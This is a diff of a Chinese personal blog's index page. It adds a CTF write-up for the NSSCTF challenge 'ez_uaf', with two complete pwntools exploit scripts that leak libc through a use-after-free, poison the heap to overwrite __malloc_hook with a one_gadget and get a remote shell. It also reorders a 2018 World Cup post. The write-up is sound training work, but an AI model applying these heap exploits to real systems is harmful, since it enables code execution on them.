@@ -73,6 +73,168 @@
     <div class="article-wrap">
         
             <h2 class="article-title cl">
+                <a href="/2025/04/20/tcache-malloc-hook/" title="tcache + malloc_hook">
+                    tcache + malloc_hook
+                </a>
+            </h2>
+        
+
+        <ul class="article-extra" style="margin-bottom: 20px">
+            
+            <li class="article-time">
+                2025-04-20
+            </li>
+            
+
+            
+                
+            
+
+
+        </ul>
+        <div class="article-description">
+            
+            <blockquote>
+<p>Problem: <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3105">[HNCTF 2022 WEEK4]ez_uaf</a></p>
+</blockquote>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>泄露libc 然后打malloc_hook</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>一开始不知道大于0x410可以不进tcache<br>用的填满打的 本机可以打通 不知道为什么远程打不通 看了一下log 获取的libc_base不对 好像截断了。</p>
+<pre><code class="hljs python">  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+p = remote(<span class="hljs-string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="hljs-number">23814</span>)
+<span class="hljs-comment">#p = process(&quot;./ez_uaf&quot;)</span>
+<span class="hljs-comment">#r = remote(host,port)</span>
+e = ELF(<span class="hljs-string">&#x27;./ez_uaf&#x27;</span>)
+libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size,name,content</span>):
+    p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
+    p.sendafter(<span class="hljs-string">b&#x27;Size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))
+    p.sendafter(<span class="hljs-string">b&#x27;Name: \n&#x27;</span>,name)
+    p.sendafter(<span class="hljs-string">b&#x27;Content:\n&#x27;</span>,content)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
+    p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
+    p.sendafter(<span class="hljs-string">b&#x27;Input your idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
+    p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
+    p.sendafter(<span class="hljs-string">b&#x27;Input your idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):
+    p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))
+    p.sendafter(<span class="hljs-string">b&#x27;Input your idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+    p.send(content)
+
+new(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)
+new(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)
+new(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)
+new(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)
+new(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)
+new(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)
+new(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)
+
+new(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)
+new(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment"># fake 8</span>
+
+
+
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):
+    free(i)
+
+show(<span class="hljs-number">7</span>)
+main_arena = u64(p.recv(<span class="hljs-number">7</span>)[<span class="hljs-number">1</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+log.success(<span class="hljs-string">&quot;main_arena=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(main_arena))
+fake_fastbin = main_arena - <span class="hljs-number">0x7b</span>
+log.success(<span class="hljs-string">&quot;fake_fastbin=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(fake_fastbin))
+new(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#9</span>
+free(<span class="hljs-number">9</span>)
+edit(<span class="hljs-number">9</span>,p64(fake_fastbin))
+
+new(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#10</span>
+
+
+libc_base = main_arena -<span class="hljs-number">88</span> -<span class="hljs-number">0x18</span> - libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]
+log.success(<span class="hljs-string">&quot;libc_base=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))
+one_gadget = libc_base + <span class="hljs-number">0x10a2fc</span>
+payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">11</span> + p64(one_gadget)
+new(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,payload) <span class="hljs-comment">#11</span>
+<span class="hljs-comment">#attach(p)</span>
+p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
+p.sendafter(<span class="hljs-string">b&#x27;Size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">10</span>))
+
+<span class="hljs-comment">#edit(0,b&#x27;c&#x27;*0x80)</span>
+p.interactive()</code></pre>
+
+<p>后面换成0x410不进tcache就可以打通远程了</p>
+<pre><code class="hljs python">  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+p = remote(<span class="hljs-string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="hljs-number">23814</span>)
+<span class="hljs-comment">#p = process(&quot;./ez_uaf&quot;)</span>
+<span class="hljs-comment">#r = remote(host,port)</span>
+e = ELF(<span class="hljs-string">&#x27;./ez_uaf&#x27;</span>)
+libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size,name,content</span>):
+    p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
+    p.sendafter(<span class="hljs-string">b&#x27;Size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))
+    p.sendafter(<span class="hljs-string">b&#x27;Name: \n&#x27;</span>,name)
+    p.sendafter(<span class="hljs-string">b&#x27;Content:\n&#x27;</span>,content)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
+    p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
+    p.sendafter(<span class="hljs-string">b&#x27;Input your idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
+    p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
+    p.sendafter(<span class="hljs-string">b&#x27;Input your idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):
+    p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))
+    p.sendafter(<span class="hljs-string">b&#x27;Input your idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+    p.send(content)
+
+new(<span class="hljs-number">0x410</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x410</span>) <span class="hljs-comment">#大于等于0x410不进tcache</span>
+new(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)
+new(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)
+free(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">0</span>)
+p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)
+main_arena = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) 
+libc_base = main_arena - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]
+log.success(<span class="hljs-string">&quot;libc_base=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))
+one_gadget = libc_base + <span class="hljs-number">0x10a2fc</span>
+free(<span class="hljs-number">1</span>)
+free(<span class="hljs-number">2</span>)
+edit(<span class="hljs-number">1</span>,p64(main_arena-<span class="hljs-number">0x7b</span>))
+new(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)
+new(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#4</span>
+edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">11</span>+p64(one_gadget))
+<span class="hljs-comment">#attach(p)</span>
+
+p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
+p.sendafter(<span class="hljs-string">b&#x27;Size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">10</span>))
+p.interactive()</code></pre>
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>tcache题还是知道的特性少了.</p>
+
+        </div>
+        
+            
+        
+        
+    </div>
+</article>
+
+        
+            <article class="article">
+    <div class="article-wrap">
+        
+            <h2 class="article-title cl">
                 <a href="/2025/03/20/ZJCTF-2019-EasyHeap/" title="[ZJCTF 2019]EasyHeap">
                     [ZJCTF 2019]EasyHeap
                 </a>
@@ -351,6 +513,45 @@ p.interactive()</code></pre>
     <div class="article-wrap">
         
             <h2 class="article-title cl">
+                <a href="/2018/06/24/2018年世界杯-赛程表/" title="2018年世界杯-赛程表">
+                    2018年世界杯-赛程表
+                </a>
+            </h2>
+        
+
+        <ul class="article-extra" style="margin-bottom: 20px">
+            
+            <li class="article-time">
+                2018-06-24
+            </li>
+            
+
+            
+                
+            
+
+
+        </ul>
+        <div class="article-description">
+            
+            <img src="/2018/06/24/2018%E5%B9%B4%E4%B8%96%E7%95%8C%E6%9D%AF-%E8%B5%9B%E7%A8%8B%E8%A1%A8/1.jpg" class="" title="赛程表">
+
+<img src="/2018/06/24/2018%E5%B9%B4%E4%B8%96%E7%95%8C%E6%9D%AF-%E8%B5%9B%E7%A8%8B%E8%A1%A8/2.jpg" class="" title="j1an">
+
+
+        </div>
+        
+            
+        
+        
+    </div>
+</article>
+
+        
+            <article class="article">
+    <div class="article-wrap">
+        
+            <h2 class="article-title cl">
                 <a href="/2018/06/24/2018年世界杯CCTV5 potplayer直播稳定地址/" title="2018年世界杯CCTV5 potplayer直播稳定地址">
                     2018年世界杯CCTV5 potplayer直播稳定地址
                 </a>
@@ -386,45 +587,6 @@ p.interactive()</code></pre>
 <h3 id="VIUTV-1080P-美国-粤语-VIUTV-1080P-美国-粤语"><a href="#VIUTV-1080P-美国-粤语-VIUTV-1080P-美国-粤语" class="headerlink" title="VIUTV-1080P(美国 粤语)VIUTV-1080P(美国 粤语)"></a><a href="#VIUTV-1080P-%E7%BE%8E%E5%9B%BD-%E7%B2%A4%E8%AF%AD" title="VIUTV-1080P(美国 粤语)">VIUTV-1080P(美国 粤语)</a>VIUTV-1080P(美国 粤语)</h3><p><a target="_blank" rel="noopener" href="http://173.64.66.171:9981/stream/channel/968405a3b3d21b7a95bf7a0da2c161ee?ticket=F61D5B21491408F1B7437C9A856DEB803F87D2F2">http://173.64.66.171:9981/stream/channel/968405a3b3d21b7a95bf7a0da2c161ee?ticket=F61D5B21491408F1B7437C9A856DEB803F87D2F2</a></p>
 <h3 id="CCTV-5-1080P-西安-广电网-CCTV-5-1080P-西安-广电网-1"><a href="#CCTV-5-1080P-西安-广电网-CCTV-5-1080P-西安-广电网-1" class="headerlink" title="CCTV-5-1080P(西安 广电网)CCTV-5-1080P(西安 广电网)"></a><a href="#CCTV-5-1080P-%E8%A5%BF%E5%AE%89-%E5%B9%BF%E7%94%B5%E7%BD%91-1" title="CCTV-5-1080P(西安 广电网)">CCTV-5-1080P(西安 广电网)</a>CCTV-5-1080P(西安 广电网)</h3><p><a target="_blank" rel="noopener" href="http://124.47.33.211/PLTV/88888888/224/3221225489/index.m3u8">http://124.47.33.211/PLTV/88888888/224/3221225489/index.m3u8</a></p>
 <h3 id="CCTV-5-1080P-江苏-移动-CCTV-5-1080P-江苏-移动"><a href="#CCTV-5-1080P-江苏-移动-CCTV-5-1080P-江苏-移动" class="headerlink" title="CCTV-5-1080P(江苏 移动)CCTV-5-1080P(江苏 移动)"></a><a href="#CCTV-5-1080P-%E6%B1%9F%E8%8B%8F-%E7%A7%BB%E5%8A%A8" title="CCTV-5-1080P(江苏 移动)">CCTV-5-1080P(江苏 移动)</a>CCTV-5-1080P(江苏 移动)</h3><p><a target="_blank" rel="noopener" href="http://183.207.248.71/cntv/live1/HD-2500k-1080P-cctv5/HD-2500k-1080P-cctv5">http://183.207.248.71/cntv/live1/HD-2500k-1080P-cctv5/HD-2500k-1080P-cctv5</a></p>
-
-        </div>
-        
-            
-        
-        
-    </div>
-</article>
-
-        
-            <article class="article">
-    <div class="article-wrap">
-        
-            <h2 class="article-title cl">
-                <a href="/2018/06/24/2018年世界杯-赛程表/" title="2018年世界杯-赛程表">
-                    2018年世界杯-赛程表
-                </a>
-            </h2>
-        
-
-        <ul class="article-extra" style="margin-bottom: 20px">
-            
-            <li class="article-time">
-                2018-06-24
-            </li>
-            
-
-            
-                
-            
-
-
-        </ul>
-        <div class="article-description">
-            
-            <img src="/2018/06/24/2018%E5%B9%B4%E4%B8%96%E7%95%8C%E6%9D%AF-%E8%B5%9B%E7%A8%8B%E8%A1%A8/1.jpg" class="" title="赛程表">
-
-<img src="/2018/06/24/2018%E5%B9%B4%E4%B8%96%E7%95%8C%E6%9D%AF-%E8%B5%9B%E7%A8%8B%E8%A1%A8/2.jpg" class="" title="j1an">
-
 
         </div>
         
@@ -484,14 +646,14 @@ p.interactive()</code></pre>
         
         <div class="widget-post widget" style="order: 1 ">
             <h2 class="widget-title"><i class="fa fa-file-text"></i> 近期文章</h2>
-            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/ORW2/">ORW2</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E7%AE%80%E5%8D%95ORW%E5%88%9D%E6%8E%A2/">简单ORW初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/2-34-%E9%AB%98%E7%89%88%E6%9C%AClibc-safe-linking-%E5%88%9D%E4%BD%93%E9%AA%8C-%E8%A2%AB%E6%81%B6%E5%BF%83%E6%AD%BB%E4%BA%86/">2.34 高版本libc safe-linking 初体验 (被恶心死了)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E5%85%A5%E9%97%A8%E7%9A%84UAF/">入门的UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/tcache%E4%BA%8C%E6%AC%A1%E5%B7%A9%E5%9B%BA-malloc-hook-onegadget/">tcache二次巩固 + __malloc_hook + onegadget</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E5%85%B7%E6%9C%89key%E7%9A%84%E9%AB%98%E7%89%88%E6%9C%ACtcache-attack%E5%88%9D%E4%BD%93%E9%AA%8C/">具有key的高版本tcache attack初体验</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/ret2csu-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%A7%A3%E7%AD%94/">ret2csu 第一次解答</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/">简单的堆溢出</a></li></ul>
+            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/04/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2023-%E5%86%B3%E8%B5%9B-Printf-but-not-fmtstr/">[羊城杯 2023 决赛]Printf but not fmtstr</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/ORW2/">ORW2</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E7%AE%80%E5%8D%95ORW%E5%88%9D%E6%8E%A2/">简单ORW初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/2-34-%E9%AB%98%E7%89%88%E6%9C%AClibc-safe-linking-%E5%88%9D%E4%BD%93%E9%AA%8C-%E8%A2%AB%E6%81%B6%E5%BF%83%E6%AD%BB%E4%BA%86/">2.34 高版本libc safe-linking 初体验 (被恶心死了)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E5%85%A5%E9%97%A8%E7%9A%84UAF/">入门的UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/tcache%E4%BA%8C%E6%AC%A1%E5%B7%A9%E5%9B%BA-malloc-hook-onegadget/">tcache二次巩固 + __malloc_hook + onegadget</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E5%85%B7%E6%9C%89key%E7%9A%84%E9%AB%98%E7%89%88%E6%9C%ACtcache-attack%E5%88%9D%E4%BD%93%E9%AA%8C/">具有key的高版本tcache attack初体验</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/ret2csu-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%A7%A3%E7%AD%94/">ret2csu 第一次解答</a></li></ul>
         </div>
         
 
         
         <div class="widget-tags widget" style="order: 2 ">
             <h2 class="widget-title"><i class="fa fa-tags"></i> 标签</h2>
-            <a href="/tags/malloc-hook/" style="font-size: 12px;">_malloc_hook</a> <a href="/tags/glibc/" style="font-size: 16px;">glibc</a> <a href="/tags/heap/" style="font-size: 18px;">heap</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 12px;">orw</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 12px;">shellcode</a> <a href="/tags/stack/" style="font-size: 12px;">stack</a> <a href="/tags/tcache/" style="font-size: 14px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 12px;">世界杯</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a>
+            <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/malloc-hook/" style="font-size: 12px;">_malloc_hook</a> <a href="/tags/glibc/" style="font-size: 16px;">glibc</a> <a href="/tags/heap/" style="font-size: 18px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 12px;">orw</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 12px;">shellcode</a> <a href="/tags/stack/" style="font-size: 12px;">stack</a> <a href="/tags/tcache/" style="font-size: 14px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unlink/" style="font-size: 10px;">unlink</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 12px;">世界杯</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a>
         </div>
         
 
